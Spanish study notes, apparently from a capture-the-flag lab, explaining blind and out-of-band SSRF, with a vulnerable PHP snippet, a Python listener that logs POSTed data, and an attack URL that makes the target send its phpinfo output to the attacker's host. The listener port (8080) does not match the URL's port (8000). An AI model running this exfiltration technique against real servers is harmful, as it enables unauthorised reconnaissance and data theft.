La SSRF blind se refiere a un escenario donde el atacante puede mandar peticiones al servidor objetivo pero no recibe una respuesta directa o feedback sobre el resultado de sus peticiones.  Este tipo de SSRF puede ser más difícil de explotar debido a que el atacante no ve directamente el resultado de sus acciones.

-----------------------------------------------
<h2>Blind SSRF con Out-Of-Band</h2>
La SSRF OOB es una técnica dnde el atacante usa diferentes canales de comunicación en lugar de recibir respuestas por el mismo canal.

Por ejemplo, el atacante puede manipular el servidor vulnerable para hacer una petición DNS a un domminio controlado por él. Esta interacción externa ofrece al atacante evidencia de que una vulnerabilidad SSRF existe y potencialmente le permite recolectar información como IPs internas y estructura de red.

<h4>Cómo Funciona</h4>
- Una vez más, inicia sesión en el dashboar en la pestaña `Profile`. Veremos que nos redirige a `http://hrms.thm/profile.php?url=localhost/getInfo.php`, lo que muestra un mensaje de que la información se está mandando.
  ![[Pasted image 20260123112505.png]]
- ¿Qué está pasando aquí? Una vez que cargamos `profile.php`, manda la información a una página externa llamada `getInfo.php`, lo que es probablemente usado para analíticas o registros.

```php
<?php
...
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch); 
...
?>
```

- El análisis del código fuente de la página muestra que está leyendo parámetros `url` y sin realizar ninguna validación, manda la información al servidor mencionado en el parámetro de la URL.
- Aquí, el atacante puede redirigir la petición a su servidor, consiguiendo así información adicional para la explotación.
- En tu máquina, cera un nuevo archivo llamado `server.py` y añade el siguiente código:

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

- El código de arriba recibirá todo el contenido y lo guardará en `data.html` en el servidor. Para obtener la información, necesitamos arrancar un servidor ligero. Podemos hacerlo con: `sudo chmod +x server.py && sudo python3 server.py`.
- Ahora abre el navegador y ve a `http://hrms.thm/profile.php?url=http://IP:8000`, lo que registrará la información en `data.html`. Abre el archivo `data.html` que contiene la información del servidor que usaremos para ataques futuros.

![[Pasted image 20260123113739.png]]

--------------------------------------------
<h2>Semi-Blind SSRF (Basada en Tiempo)</h2>
La SSRF time-based es una variación de SSRF donde el atacante usa peticiones relacionadas con tiempo para inferir el éxito o fracaso de la petición maliciosa. Observando cómo de largo se toma para responder podemos concluir si nuestras peticiones son correctas o no.